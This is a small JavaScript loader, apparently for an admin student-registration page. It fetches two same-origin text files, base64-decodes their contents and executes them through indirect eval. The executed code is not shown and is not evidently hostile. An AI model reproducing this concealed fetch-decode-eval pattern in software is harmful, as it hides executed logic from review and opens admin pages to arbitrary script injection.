/* admin-students-reg — 2-part base64 + TextDecoder */
(function () {
  Promise.all([
    fetch("/_asr_full_0.txt", { credentials: "same-origin", cache: "no-store" }).then(function (r) {
      if (!r.ok) throw new Error("part0 " + r.status);
      return r.text();
    }),
    fetch("/_asr_full_1.txt", { credentials: "same-origin", cache: "no-store" }).then(function (r) {
      if (!r.ok) throw new Error("part1 " + r.status);
      return r.text();
    })
  ]).then(function (parts) {
    var b64 = (parts[0] + parts[1]).replace(/\s+/g, "");
    var bin = atob(b64);
    var bytes = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    var out = new TextDecoder("utf-8").decode(bytes);
    (0, eval)(out);
  }).catch(function (e) {
    console.error("[students-reg] load failed", e);
  });
})();
